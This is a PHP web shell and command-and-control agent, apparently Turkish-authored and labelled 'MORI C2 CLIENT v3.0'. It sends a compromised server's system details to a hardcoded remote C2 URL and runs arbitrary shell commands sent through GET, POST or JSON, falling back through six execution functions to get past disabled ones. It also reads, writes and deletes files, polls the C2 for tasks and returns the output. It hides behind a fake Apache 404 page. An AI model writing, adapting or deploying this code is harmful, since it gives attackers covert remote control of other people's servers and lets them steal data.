<?php
ob_start();
ini_set('display_errors', 0);
ini_set('log_errors', 1);
error_reporting(E_ALL);

set_time_limit(0);
ignore_user_abort(true);

$c2_server = "https://juiceshop.cc/nebakiyonla_hurmsaqw/c2serverr.php";
$debug_mode = true; 

$is_windows = stripos(PHP_OS, 'WIN') === 0;
$is_mac = stripos(PHP_OS, 'DAR') === 0;
$os_type = $is_windows ? 'WINDOWS' : ($is_mac ? 'MACOS' : 'LINUX');

function detect_web_shell_url() {
    $url = '';
    
    // HTTPS kontrolü
    $https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || 
             (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443);
    $protocol = $https ? 'https://' : 'http://';
    
    // Host tespiti (en güvenilir yöntem)
    if (isset($_SERVER['HTTP_HOST'])) {
        $host = $_SERVER['HTTP_HOST'];
    } elseif (isset($_SERVER['SERVER_NAME'])) {
        $host = $_SERVER['SERVER_NAME'];
        $port = $_SERVER['SERVER_PORT'] ?? 80;
        if (($protocol === 'http://' && $port != 80) || ($protocol === 'https://' && $port != 443)) {
            $host .= ':' . $port;
        }
    } else {
        $host = 'localhost';
    }
    
    // Script yolu
    $script = $_SERVER['SCRIPT_NAME'] ?? '/';
    
    // Tam URL
    $url = $protocol . $host . $script;
    
    // IP bazlı alternatif (host çözümlenemezse)
    if (strpos($host, 'localhost') !== false || $host === '127.0.0.1') {
        $server_ip = $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? null;
        if ($server_ip && $server_ip !== '127.0.0.1' && $server_ip !== '::1') {
            $url = $protocol . $server_ip . ':' . ($_SERVER['SERVER_PORT'] ?? 80) . $script;
        }
    }
    
    return $url;
}

$web_shell_url = detect_web_shell_url();
function generate_client_id() {
    $id_file = __DIR__ . '/.mori_id';
    
    if (file_exists($id_file)) {
        $saved_id = file_get_contents($id_file);
        if ($saved_id && strlen($saved_id) > 10) {
            return trim($saved_id);
        }
    }
    
    $components = [
        gethostname(),
        __DIR__,
        $_SERVER['DOCUMENT_ROOT'] ?? __DIR__,
        php_uname('n'),
        php_uname('s')
    ];
    
    $new_id = 'client_' . md5(implode('|', $components));
    
    @file_put_contents($id_file, $new_id);
    @chmod($id_file, 0666);
    
    return $new_id;
}
$client_id = generate_client_id();

function http_request($method, $url, $data = null, $timeout = 10) {
    $result = null;
    $method = strtoupper($method);
    
    // YÖNTEM 1: cURL (en güvenilir)
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 3);
        
        if ($method === 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: text/plain']);
        }
        
        $result = @curl_exec($ch);
        $error = curl_error($ch);
        $info = curl_getinfo($ch);
        curl_close($ch);
        
        if ($result !== false) {
            return $result;
        }
    }
    
    // YÖNTEM 2: file_get_contents with stream context
    if (ini_get('allow_url_fopen')) {
        $opts = [
            'http' => [
                'method' => $method,
                'timeout' => $timeout,
                'ignore_errors' => true,
                'follow_location' => 1,
                'max_redirects' => 3
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false
            ]
        ];
        
        if ($method === 'POST' && $data) {
            $opts['http']['header'] = "Content-Type: text/plain\r\n";
            $opts['http']['content'] = $data;
        }
        
        $context = stream_context_create($opts);
        $result = @file_get_contents($url, false, $context);
        
        if ($result !== false) {
            return $result;
        }
    }
    
    // YÖNTEM 3: fsockopen (en düşük seviye)
    $parts = parse_url($url);
    $host = $parts['host'];
    $port = $parts['scheme'] === 'https' ? 443 : 80;
    $path = $parts['path'] . (isset($parts['query']) ? '?' . $parts['query'] : '');
    
    $fp = @fsockopen(($port === 443 ? 'ssl://' : '') . $host, $port, $errno, $errstr, 5);
    if ($fp) {
        $out = "$method $path HTTP/1.1\r\n";
        $out .= "Host: $host\r\n";
        $out .= "Connection: Close\r\n";
        
        if ($method === 'POST' && $data) {
            $out .= "Content-Type: text/plain\r\n";
            $out .= "Content-Length: " . strlen($data) . "\r\n";
            $out .= "\r\n";
            $out .= $data;
        } else {
            $out .= "\r\n";
        }
        
        fwrite($fp, $out);
        $response = '';
        while (!feof($fp)) {
            $response .= fgets($fp, 128);
        }
        fclose($fp);
        
        // Header'ları ayır
        $parts = explode("\r\n\r\n", $response, 2);
        if (isset($parts[1])) {
            return $parts[1];
        }
    }
    
    return null;
}

function http_get($url) {
    return http_request('GET', $url);
}

function http_post($url, $data) {
    return http_request('POST', $url, $data);
}

// =====================================================
// VERİ KODLAMA İŞLEMLERİ
// =====================================================
function safe_base64_encode($data) {
    return str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($data));
}

function safe_json_encode($data) {
    return json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
}

// =====================================================
// GELİŞMİŞ SİSTEM BİLGİ TOPLAMA
// =====================================================
function collect_system_info() {
    $info = [
        'os' => [
            'type' => PHP_OS,
            'family' => detect_os_family(),
            'hostname' => gethostname(),
            'arch' => php_uname('m'),
            'kernel' => php_uname('r'),
            'full' => php_uname('a')
        ],
        'web' => [
            'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
            'user' => get_current_user(),
            'cwd' => getcwd() ?: __DIR__,
            'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? '',
            'script_path' => __FILE__,
            'web_shell_url' => $GLOBALS['web_shell_url'],
            'server_ip' => $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? 'unknown',
            'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
        ],
        'php' => [
            'version' => PHP_VERSION,
            'sapi' => php_sapi_name(),
            'extensions' => get_loaded_extensions(),
            'disabled_functions' => ini_get('disable_functions'),
            'memory_limit' => ini_get('memory_limit'),
            'max_execution_time' => ini_get('max_execution_time')
        ],
        'disk' => [
            'total' => @disk_total_space(__DIR__),
            'free' => @disk_free_space(__DIR__)
        ],
        'time' => [
            'timestamp' => time(),
            'timezone' => date_default_timezone_get(),
            'datetime' => date('Y-m-d H:i:s')
        ],
        'permissions' => [
            'can_read' => is_readable(__FILE__),
            'can_write' => is_writable(__DIR__),
            'can_execute' => is_executable(__FILE__)
        ]
    ];
    
    // Windows özel bilgiler
    if ($GLOBALS['is_windows']) {
        $info['windows'] = [
            'comspec' => getenv('COMSPEC'),
            'windir' => getenv('WINDIR'),
            'username' => getenv('USERNAME'),
            'computername' => getenv('COMPUTERNAME')
        ];
    }
    
    return $info;
}

function detect_os_family() {
    $os = strtoupper(PHP_OS);
    if (strpos($os, 'WIN') === 0) return 'WINDOWS';
    if (strpos($os, 'DAR') === 0) return 'MACOS';
    if (strpos($os, 'LINUX') === 0) return 'LINUX';
    if (strpos($os, 'BSD') !== false) return 'BSD';
    return 'UNKNOWN';
}

// =====================================================
// C2 API İŞLEMLERİ (GELİŞMİŞ)
// =====================================================
function c2_register($server, $id) {
    $sysinfo = collect_system_info();
    
    $payload = [
        'id' => $id,
        'sysinfo' => $sysinfo,
        'timestamp' => time(),
        'version' => '3.0'
    ];
    
    $encoded = safe_base64_encode(safe_json_encode($payload));
    $result = http_post($server . '?act=reg', $encoded);
    
    return $result === 'ok';
}

function c2_get_task($server, $id) {
    $url = $server . '?act=get_task&id=' . urlencode($id);
    return http_get($url);
}

function c2_send_result($server, $id, $command, $output, $task_id = null) {
    $payload = [
        'id' => $id,
        'task_id' => $task_id,
        'command' => $command,
        'output' => base64_encode($output),
        'timestamp' => time()
    ];
    
    $encoded = safe_base64_encode(safe_json_encode($payload));
    return http_post($server . '?act=set_res', $encoded);
}

function c2_update_status($server, $id, $status = 'alive') {
    $payload = [
        'id' => $id,
        'status' => $status,
        'timestamp' => time()
    ];
    
    $encoded = safe_base64_encode(safe_json_encode($payload));
    return http_post($server . '?act=update', $encoded);
}

// =====================================================
// GELİŞMİŞ KOMUT ÇALIŞTIRMA MOTORU
// =====================================================
function execute_command($cmd) {
    global $is_windows;
    
    $cmd = trim($cmd);
    if (empty($cmd)) return '';
    
    $output = '';
    $methods = [];
    
    // ÖZEL KOMUTLAR (PHP CORE)
    
    // pwd / cd
    if ($cmd === 'pwd' || $cmd === 'cd') {
        return getcwd() ?: __DIR__;
    }
    
    // CD ile dizin değiştir
    if (strpos($cmd, 'CD ') === 0) {
        $path = trim(substr($cmd, 3));
        if (@chdir($path)) {
            return getcwd();
        }
        return "[ERROR] Cannot change to: $path";
    }
    
    // FILELIST - Dizin listele
    if (strpos($cmd, 'FILELIST ') === 0) {
        $path = trim(substr($cmd, 9)) ?: getcwd();
        return list_directory($path);
    }
    
    // FILEREAD - Dosya oku
    if (strpos($cmd, 'FILEREAD ') === 0) {
        $file = trim(substr($cmd, 9));
        return read_file($file);
    }
    
    // FILEWRITE - Dosya yaz
    if (strpos($cmd, 'FILEWRITE ') === 0) {
        $parts = explode(' ', $cmd, 3);
        if (count($parts) >= 3) {
            return write_file($parts[1], $parts[2]);
        }
        return "[ERROR] FILEWRITE <path> <base64_content>";
    }
    
    // FILEDELETE - Dosya sil
    if (strpos($cmd, 'FILEDELETE ') === 0) {
        $file = trim(substr($cmd, 11));
        return delete_file($file);
    }
    
    // FILECOPY - Dosya kopyala
    if (strpos($cmd, 'FILECOPY ') === 0) {
        $parts = explode(' ', $cmd, 3);
        if (count($parts) >= 3) {
            return copy_file($parts[1], $parts[2]);
        }
        return "[ERROR] FILECOPY <source> <dest>";
    }
    
    // DIRCREATE - Dizin oluştur
    if (strpos($cmd, 'DIRCREATE ') === 0) {
        $path = trim(substr($cmd, 10));
        return create_directory($path);
    }
    
    // DIRDELETE - Dizin sil
    if (strpos($cmd, 'DIRDELETE ') === 0) {
        $path = trim(substr($cmd, 10));
        return delete_directory($path);
    }
    
    // SISTEM BILGILERI
    if ($cmd === 'sysinfo' || $cmd === 'system') {
        return json_encode(collect_system_info(), JSON_PRETTY_PRINT);
    }
    
    if ($cmd === 'whoami') {
        return get_current_user() ?: 'unknown';
    }
    
    if ($cmd === 'hostname') {
        return gethostname();
    }
    
    if ($cmd === 'dir' || $cmd === 'ls') {
        return list_directory(getcwd());
    }
    
    if ($cmd === 'clear' || $cmd === 'cls') {
        return '__CLEAR__';
    }
    
    // SİSTEM KOMUTU ÇALIŞTIR
    return execute_system_command($cmd);
}

function execute_system_command($cmd) {
    $output = '';
    $methods_tried = [];
    
    // YÖNTEM 1: shell_exec (en hızlı)
    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = 'shell_exec';
        $result = @shell_exec($cmd . ' 2>&1');
        if ($result !== null) {
            return $result;
        }
    }
    
    // YÖNTEM 2: exec
    if (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = 'exec';
        @exec($cmd . ' 2>&1', $output_lines, $return_var);
        if (!empty($output_lines)) {
            return implode("\n", $output_lines);
        }
    }
    
    // YÖNTEM 3: system (output buffer ile)
    if (function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = 'system';
        ob_start();
        @system($cmd . ' 2>&1');
        $result = ob_get_clean();
        if ($result) {
            return $result;
        }
    }
    
    // YÖNTEM 4: passthru
    if (function_exists('passthru') && !in_array('passthru', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = 'passthru';
        ob_start();
        @passthru($cmd . ' 2>&1');
        $result = ob_get_clean();
        if ($result) {
            return $result;
        }
    }
    
    // YÖNTEM 5: proc_open (en karmaşık)
    if (function_exists('proc_open')) {
        $methods_tried[] = 'proc_open';
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        
        $process = @proc_open($cmd, $descriptors, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $stdout = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            
            if ($stdout || $stderr) {
                return $stdout . ($stderr ? "\nSTDERR:\n" . $stderr : '');
            }
        }
    }
    
    // YÖNTEM 6: popen
    if (function_exists('popen')) {
        $methods_tried[] = 'popen';
        $handle = @popen($cmd . ' 2>&1', 'r');
        if ($handle) {
            $result = '';
            while (!feof($handle)) {
                $result .= fgets($handle);
            }
            pclose($handle);
            if ($result) {
                return $result;
            }
        }
    }
    
    return "[ERROR] Cannot execute command. Tried: " . implode(', ', $methods_tried);
}

// =====================================================
// DOSYA SİSTEMİ İŞLEMLERİ
// =====================================================
function list_directory($path) {
    $path = str_replace('\\', '/', $path);
    $real = realpath($path);
    
    if (!$real || !is_dir($real)) {
        return json_encode(['error' => "Directory not found: $path"]);
    }
    
    $items = [];
    $dir = @opendir($real);
    
    if (!$dir) {
        return json_encode(['error' => "Cannot open directory: $path"]);
    }
    
    while (($file = readdir($dir)) !== false) {
        if ($file === '.' || $file === '..') continue;
        
        $full = $real . DIRECTORY_SEPARATOR . $file;
        $stat = @stat($full);
        
        $items[] = [
            'name' => $file,
            'type' => is_dir($full) ? 'dir' : 'file',
            'path' => str_replace('\\', '/', $full),
            'size' => is_file($full) ? filesize($full) : 0,
            'perms' => substr(sprintf('%o', fileperms($full)), -4),
            'owner' => function_exists('fileowner') ? fileowner($full) : null,
            'group' => function_exists('filegroup') ? filegroup($full) : null,
            'modified' => filemtime($full),
            'readable' => is_readable($full),
            'writable' => is_writable($full),
            'executable' => is_executable($full)
        ];
    }
    
    closedir($dir);
    
    // Dizinleri önce sırala
    usort($items, function($a, $b) {
        if ($a['type'] === $b['type']) {
            return strcasecmp($a['name'], $b['name']);
        }
        return $a['type'] === 'dir' ? -1 : 1;
    });
    
    return json_encode($items, JSON_PRETTY_PRINT);
}

function read_file($file) {
    $real = realpath($file);
    
    if (!$real || !is_file($real) || !is_readable($real)) {
        return "[ERROR] Cannot read file: $file";
    }
    
    $content = @file_get_contents($real);
    return $content !== false ? $content : "[ERROR] Read failed";
}

function write_file($file, $content_b64) {
    $content = base64_decode($content_b64);
    $dir = dirname($file);
    
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }
    
    $result = @file_put_contents($file, $content);
    return $result !== false ? "OK: $result bytes written" : "[ERROR] Write failed";
}

function delete_file($file) {
    $real = realpath($file);
    
    if (!$real || !is_file($real)) {
        return "[ERROR] File not found: $file";
    }
    
    return @unlink($real) ? "OK: Deleted $file" : "[ERROR] Delete failed";
}

function copy_file($src, $dst) {
    return @copy($src, $dst) ? "OK: Copied $src to $dst" : "[ERROR] Copy failed";
}

function create_directory($path) {
    return @mkdir($path, 0755, true) ? "OK: Created $path" : "[ERROR] Cannot create directory";
}

function delete_directory($path) {
    $real = realpath($path);
    
    if (!$real || !is_dir($real)) {
        return "[ERROR] Directory not found: $path";
    }
    
    $items = @scandir($real);
    if ($items && count($items) > 2) {
        return "[ERROR] Directory not empty";
    }
    
    return @rmdir($real) ? "OK: Deleted $path" : "[ERROR] Cannot delete directory";
}

// =====================================================
// OTOMATİK KAYIT (HER ERİŞİMDE)
// =====================================================
function auto_register() {
    global $c2_server, $client_id, $debug_mode;
    
    $result = c2_register($c2_server, $client_id);
    
    if ($debug_mode) {
        $log = date('Y-m-d H:i:s') . " - Register: " . ($result ? 'OK' : 'FAILED') . " - ID: $client_id\n";
        @file_put_contents(__DIR__ . '/mori_debug.log', $log, FILE_APPEND);
    }
    
    return $result;
}

// =====================================================
// WEB SHELL API ENDPOINTS
// =====================================================

// DEBUG MODE
if (isset($_GET['debug']) && $debug_mode) {
    header('Content-Type: text/plain; charset=utf-8');
    echo "MORI C2 CLIENT v3.0\n";
    echo "====================\n\n";
    echo "Client ID: $client_id\n";
    echo "OS: $os_type\n";
    echo "Web Shell URL: $web_shell_url\n";
    echo "Current User: " . get_current_user() . "\n";
    echo "Current Directory: " . getcwd() . "\n";
    echo "PHP Version: " . PHP_VERSION . "\n";
    echo "Server Software: " . ($_SERVER['SERVER_SOFTWARE'] ?? 'unknown') . "\n\n";
    
    echo "SYSTEM INFO:\n";
    print_r(collect_system_info());
    exit;
}

// REGISTER ONLY (manuel kayıt için)
if (isset($_GET['register'])) {
    header('Content-Type: text/plain; charset=utf-8');
    $result = auto_register();
    echo $result ? "OK - Registered successfully" : "FAILED - Registration failed";
    exit;
}

// COMMAND EXECUTION VIA GET (base64 encoded)
if (isset($_GET['m'])) {
    ob_end_clean(); // Discard any buffered errors/warnings from startup
    header('Content-Type: text/plain; charset=utf-8');
    header('Access-Control-Allow-Origin: *');
    $cmd = base64_decode($_GET['m']);
    if ($cmd === false) {
        die('[ERROR] Invalid base64 encoding');
    }
    echo execute_command($cmd);
    exit;
}

// COMMAND EXECUTION VIA POST
if (isset($_POST['m'])) {
    ob_end_clean();
    header('Content-Type: text/plain; charset=utf-8');
    header('Access-Control-Allow-Origin: *');
    $cmd = $_POST['m'];
    if (strpos($cmd, 'base64:') === 0) {
        $cmd = base64_decode(substr($cmd, 7));
    }
    echo execute_command($cmd);
    exit;
}

// JSON API (ileri düzey)
if (isset($_SERVER['CONTENT_TYPE']) && strpos($_SERVER['CONTENT_TYPE'], 'application/json') !== false) {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if ($input && isset($input['action'])) {
        header('Content-Type: application/json; charset=utf-8');
        
        switch ($input['action']) {
            case 'exec':
                $cmd = $input['command'] ?? '';
                $result = execute_command($cmd);
                echo json_encode(['success' => true, 'output' => $result]);
                break;
                
            case 'info':
                echo json_encode(collect_system_info());
                break;
                
            case 'register':
                $success = auto_register();
                echo json_encode(['success' => $success, 'client_id' => $client_id]);
                break;
                
            default:
                echo json_encode(['error' => 'Unknown action']);
        }
        exit;
    }
}

// =====================================================
// BACKGROUND AGENT MODE (CLI veya ?agent=1 ile)
// =====================================================
if (php_sapi_name() === 'cli' || isset($_GET['agent']) || isset($_GET['daemon'])) {
    // Agent modu - sayfa gösterilmez, sürekli çalışır
    $max_execution = isset($_GET['timeout']) ? (int)$_GET['timeout'] : 300;
    $sleep_interval = isset($_GET['sleep']) ? (int)$_GET['sleep'] : 5;
    
    auto_register();
    
    $start_time = time();
    $task_counter = 0;
    
    while ((time() - $start_time) < $max_execution) {
        $task = c2_get_task($c2_server, $client_id);
        
        if ($task && trim($task) && trim($task) !== 'no_task') {
            $task_counter++;
            $output = execute_command($task);
            c2_send_result($c2_server, $client_id, $task, $output);
        }
        
        if ($task_counter % 10 === 0) {
            c2_update_status($c2_server, $client_id);
        }
        
        sleep($sleep_interval);
    }
    
    if (php_sapi_name() === 'cli') {
        exit(0);
    }
    
    echo "MORI C2 Agent completed " . $task_counter . " tasks in " . (time() - $start_time) . " seconds\n";
    exit;
}

register_shutdown_function(function() {
    // Yanıt zaten gönderildi, connection kapandı
    // Bu noktada HTTP isteği yapmak HÂLÂ sorunlu olabilir (aynı Apache),
    // Bu yüzden doğrudan dosyaya yaz — HTTP kullanma.
    global $c2_server, $client_id, $debug_mode;

    // Kayıt isteğini kuyruğa al (dosya bazlı, HTTP yok)
    $queue_file = __DIR__ . '/.mori_queue';
    $entry = json_encode([
        'id'        => $client_id,
        'timestamp' => time(),
        'sysinfo'   => [] // Agent mode'da doldurulur
    ]);
    @file_put_contents($queue_file, $entry . "\n", FILE_APPEND | LOCK_EX);
});
?>
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html>
<head>
    <title>404 Not Found</title>
</head>
<body>
    <h1>Not Found</h1>
    <p>The requested URL <?php echo htmlspecialchars($_SERVER['REQUEST_URI']); ?> was not found on this server.</p>
    <hr>
    <address>Apache Server at <?php echo htmlspecialchars($_SERVER['HTTP_HOST']); ?> Port <?php echo $_SERVER['SERVER_PORT']; ?></address>
</body>
</html>
